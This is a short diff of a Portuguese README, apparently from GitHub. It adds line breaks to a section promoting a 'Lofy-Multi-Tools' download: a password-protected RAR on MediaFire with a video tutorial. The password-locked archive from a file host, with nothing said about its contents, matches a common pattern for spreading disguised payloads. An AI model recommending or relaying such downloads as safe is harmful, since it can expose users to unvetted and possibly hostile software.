@@ -42,6 +42,8 @@ FAÇA ASSIM IGUAL ESTÁ NA IMAGEM : ![download](https://user-images.githubuserco
 💸 <b>• DOWNLOAD Lofy-Multi-Tools : https://www.mediafire.com/file/eiqo68ewikjpxsd/userdiv.rar/file 
   <br>
 senha : possesive
+      <br>
+      <br>
 💸 <b>• VÍDEO AULA : https://www.youtube.com/embed/Yh4CiS03X2M
   
   ![3](https://user-images.githubusercontent.com/113463089/191505550-fad51b01-6c6d-4203-a076-db2fe5206265.png)
